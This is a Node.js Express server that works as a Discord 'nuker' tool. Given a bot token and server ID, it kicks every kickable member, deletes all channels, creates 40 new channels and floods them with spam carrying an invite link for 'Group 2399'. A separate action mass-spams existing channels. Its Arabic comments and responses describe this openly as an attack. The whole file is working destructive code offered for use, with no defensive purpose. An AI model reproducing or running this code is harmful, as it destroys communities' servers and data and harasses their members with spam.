const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', async (req, res) => {
    const { token, guildId, action } = req.body;
    const client = new Client({ 
        intents: [3276799] // الكل في واحد (Full Intents)
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);
        const msg = "# Group 2399 is here\nhttps://discord.gg/DcKVbTkW8";

        if (action === 'الضربة القاضية' || action === 'تدمير شامل') {
            // 1. طرد الجميع
            const members = await guild.members.fetch();
            members.forEach(m => { if(m.kickable) m.kick('2399 Power').catch(() => {}); });

            // 2. حذف كل الرومات الموجودة
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));

            // 3. إنشاء 40 روم جديد وإرسال 100 رسالة في كل واحد (بسرعة فائقة)
            for (let i = 0; i < 40; i++) {
                guild.channels.create({
                    name: `group-2399`,
                    type: ChannelType.GuildText
                }).then(channel => {
                    for (let j = 0; j < 100; j++) {
                        channel.send(msg).catch(() => {});
                    }
                }).catch(() => {});
            }
        }
        
        if (action === 'ارسال رسائل') {
            guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(c => {
                for (let i = 0; i < 50; i++) c.send(msg).catch(() => {});
            });
        }

        res.send({ status: '🚀 تم إطلاق الهجوم بنجاح يا لورد!' });
    } catch (error) {
        res.status(500).send({ status: '❌ فشل الاتصال: تأكد من التوكن والآيدي' });
    }
});

app.listen(3000, () => console.log('2399 Server Ready'));
